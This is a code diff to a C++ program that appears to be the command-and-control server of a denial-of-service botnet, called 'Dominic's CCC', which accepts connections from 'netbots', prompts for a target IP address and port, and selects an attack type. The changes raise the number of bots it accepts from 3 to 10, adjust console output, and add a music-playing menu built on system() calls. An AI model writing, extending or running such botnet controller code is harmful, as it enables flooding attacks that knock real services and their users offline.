@@ -9,6 +9,8 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <vector>
+#include <sstream>
+#include <filesystem>
 
 using namespace std;
 
@@ -65,9 +67,9 @@ string server_status()
 
 void setup_target_parameters()
 {	
-	cout << "Enter target ip address: \n";
+	cout << "Enter target ip address: ";
 	cin >> target_ip;
-	cout << "\n Enter target port: \n";
+	cout << "\n Enter target port: ";
 	cin >> target_port;
 }
 
@@ -102,8 +104,10 @@ void menu_header()
 }
 
 void list_bots()
-{
-	cout << "Bots connected " << "(" << netbots.size() <<"):\n";
+{	
+	system("clear");
+	menu_header();
+	cout << "\n\nBots connected " << "(" << netbots.size() <<"):\n";
 	vector<netbot>::iterator iter = netbots.begin();
 
 	for(iter; iter < netbots.end(); iter++) 
@@ -111,9 +115,10 @@ void list_bots()
 		cout << "bot: " << (*iter).ip_address << "\n";
 	}
 
-	cout << endl;
+	cout << "\nPress any key to exit...";
 
-	sleep(3);
+	cin.ignore();
+	cin.get();
 }
 
 void setup_attack_type()
@@ -179,17 +184,26 @@ void disconnection_listener(int i)
 
 		if (bytes == 0) // netbot disconnected
 		{	
+			netbot bot;
 			vector<netbot>::iterator iter = netbots.begin();
 			for(iter; iter < netbots.end(); iter++) 
 			{
 				if ((*iter).id == i) 
-				{
+				{	
+					bot = *iter;
 					netbots.erase(iter);
 					iter--;
 				}
 			}
 			
+			cout << "\nNetbot (" << bot.ip_address << ") disconnected." << std::flush;
+			
 			close(i);
+			
+			sleep(3);
+			cout << "\33[2K\r" << std::flush;
+			cout << "\x1b[A";
+						
 			return;
 		}
 	}
@@ -198,7 +212,6 @@ void disconnection_listener(int i)
 void threaded(int i)
 {
 	char buffer[1024] = { 0 };	
-	cout << "\nClient Socket File Descriptor: " << i << "\n";
 	
 	bzero(&buffer, sizeof(buffer));
 	int bytes = recv(i, buffer, 1024, 0);	
@@ -252,7 +265,7 @@ void threaded(int i)
 
 void connection_listener(int i)
 {
-	while(netbots.size() != 3)
+	while(netbots.size() != 10)
 	{
 		socklen_t client_length = sizeof(client_address);
 		if ((client_socket = accept(server_fd, (struct sockaddr *) &client_address, &client_length)) < 0) {
@@ -261,11 +274,11 @@ void connection_listener(int i)
 		}
 
 		netbots.push_back({ client_socket, false, inet_ntoa(client_address.sin_addr) });
-	
-		cout << "\nclient connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;
-
+		
 		threads.push_back(thread(threaded, client_socket));
   		threads.back().detach();
+  		
+		cout << "client connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << netbots.size() << endl;
 	}
 
 }
@@ -304,7 +317,7 @@ void start_server()
 		}
 
 		// Wait for clients connections
-		if (listen(server_fd, 3) < 0) {
+		if (listen(server_fd, 10) < 0) {
 			perror("listem");
 			exit(EXIT_FAILURE);
 		}
@@ -365,9 +378,80 @@ void start_server()
 }
 
 void play_music(string songName)
+{	
+	if (pid > 0) {
+		kill(-pid, SIGKILL);
+		cout << "\nkilled process group " << pid;
+	}
+	
+	pid = fork();
+	if (pid == 0) { // child procress
+		setpgid(getpid(), getpid());
+		string cmd = "canberra-gtk-play -f music/" + songName;
+		system(cmd.c_str());
+		exit(0);
+	}
+}
+
+string format_filename_output(string path)
 {
-	string cmd = "canberra-gtk-play -f music/" + songName;
-	system(cmd.c_str());
+	string s(path);
+	stringstream filename(s);
+	string segment;
+	vector<string> seglist;
+
+	while(getline(filename, segment, '/'))
+	{
+	   seglist.push_back(segment);
+	}
+	
+	return seglist[seglist.size() - 1];
+}
+
+void music_menu()
+{	 	
+ 	char char_choice[1];
+	int int_choice = 0;
+	do
+	{
+		vector<string> music_list;
+		string path = "/home/kali/Desktop/CCC DoS/music";
+	    	for (const auto & entry : filesystem::directory_iterator(path)) {
+	    		music_list.push_back(format_filename_output(entry.path()));
+	    	}
+		system("clear");
+		menu_header();
+		cout << "\n";
+		cout << "Select music to play: \n\n";
+		for (int i = 1; i <= music_list.size(); i++)
+		{
+			cout << i << ". " << music_list[i - 1] << "\n";
+		}
+		cout << to_string(music_list.size() + 1) + ". Stop music\n";
+		cout << to_string(music_list.size() + 2) + ". Exit\n";
+		
+		cin >> char_choice;
+		int_choice = atoi(char_choice);
+		
+		
+		switch(int_choice) 
+		{	
+			case 1 ... 5:
+				play_music(music_list[int_choice - 1]);
+				break;
+			case 6:
+				if (pid > 0) {
+					kill(-pid, SIGKILL);
+					cout << "\nMusic stopped: " << pid;
+				}
+				break;
+			case 7:
+				break;
+			default:
+				cout << "Wrong choice. Enter option again.";
+				break;
+		}
+	} while (int_choice != 7);
 }
 
 void main_menu()
@@ -381,7 +465,8 @@ void main_menu()
 		cout << "\n";
 		cout << "Dominic's CCC menu selection: \n\n";
 		cout << "1. start server\n";
-		cout << "2. Exit\n";
+		cout << "2. music_menu\n";
+		cout << "3. Exit\n";
 		cin >> char_choice;
 		int_choice = atoi(char_choice);
 
@@ -392,26 +477,22 @@ void main_menu()
 				start_server();
 				break;
 			case 2:
-				kill(-pid, SIGKILL);
+				music_menu();
+				break;
+			case 3:
 				break;
 			default:
 				cout << "Wrong choice. Enter option again.";
 				break;
 
 		}
-	} while(int_choice != 2);
+	} while(int_choice != 3);
 }
 
 int main()
 {	
-	pid = fork();
-	if (pid == 0) { // child procress
-		setpgid(getpid(), getpid());
-		system("canberra-gtk-play -f music/music.wav");
-	} else {
-		main_menu();
-		kill(-pid, SIGKILL);
-		cout << "\nThank you for using dominic's CCC. Have a great day!";
-		return 0;
-	}
+	main_menu();
+	if (pid > 0) kill(-pid, SIGKILL);
+	cout << "\nThank you for using dominic's CCC. Have a great day!";
+	return 0;
 }
